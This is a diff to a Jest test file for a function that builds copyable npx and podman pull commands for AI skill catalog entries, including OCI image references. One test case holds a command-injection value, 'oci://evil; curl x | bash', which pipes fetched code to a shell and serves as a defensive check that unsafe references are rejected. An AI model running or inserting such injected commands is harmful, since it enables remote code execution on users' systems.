@@ -53,6 +53,56 @@ describe('getUsageAction', () => {
     expect(action).toEqual({ type: 'copy', value: 'npx skills add my-skill' });
   });
 
+  it('returns npx copy command for Git-backed skill entities', () => {
+    const action = getUsageAction(
+      entity({
+        name: 'my-skill',
+        specType: 'skill',
+        annotations: { 'rhdh.io/ai-asset-source': 'github' },
+      }),
+    );
+    expect(action).toEqual({ type: 'copy', value: 'npx skills add my-skill' });
+  });
+
+  it('returns a Podman pull command for an OCI skill reference', () => {
+    const action = getUsageAction(
+      entity({
+        name: 'document-reviewer',
+        specType: 'skill',
+        annotations: {
+          'rhdh.io/ai-asset-source': 'oci/skillimage-skills',
+          'rhdh.io/oci-skill-ref':
+            'oci://quay.io/skillimage/document-reviewer@sha256:ae46db36245efd25e84472ce32492e1db48015f7d07b6d4366fff384650695ac',
+        },
+      }),
+    );
+    expect(action).toEqual({
+      type: 'copy',
+      value:
+        'podman pull quay.io/skillimage/document-reviewer@sha256:ae46db36245efd25e84472ce32492e1db48015f7d07b6d4366fff384650695ac',
+    });
+  });
+
+  it.each([
+    { description: 'missing', reference: undefined },
+    { description: 'unsafe', reference: 'oci://evil; curl x | bash' },
+  ])(
+    'returns no action for an OCI skill with a $description reference',
+    ({ reference }) => {
+      const action = getUsageAction(
+        entity({
+          name: 'my-skill',
+          specType: 'skill',
+          annotations: {
+            'rhdh.io/ai-asset-source': 'oci/skillimage-skills',
+            ...(reference && { 'rhdh.io/oci-skill-ref': reference }),
+          },
+        }),
+      );
+      expect(action).toBeUndefined();
+    },
+  );
+
   it('returns podman pull command for the first oci:// remote', () => {
     const action = getUsageAction(
       entity({
@@ -65,7 +115,7 @@ describe('getUsageAction', () => {
     );
     expect(action).toEqual({
       type: 'copy',
-      value: 'podman pull oci://registry.example.com/models/foo:latest',
+      value: 'podman pull registry.example.com/models/foo:latest',
     });
   });
 
@@ -274,7 +324,7 @@ describe('getUsageAction', () => {
     );
     expect(action).toEqual({
       type: 'copy',
-      value: 'podman pull oci://registry.example.com/models/foo:latest',
+      value: 'podman pull registry.example.com/models/foo:latest',
     });
   });
 
@@ -292,7 +342,7 @@ describe('getUsageAction', () => {
     );
     expect(action).toEqual({
       type: 'copy',
-      value: 'podman pull oci://registry.example.com:5000/models/foo:latest',
+      value: 'podman pull registry.example.com:5000/models/foo:latest',
     });
   });
 
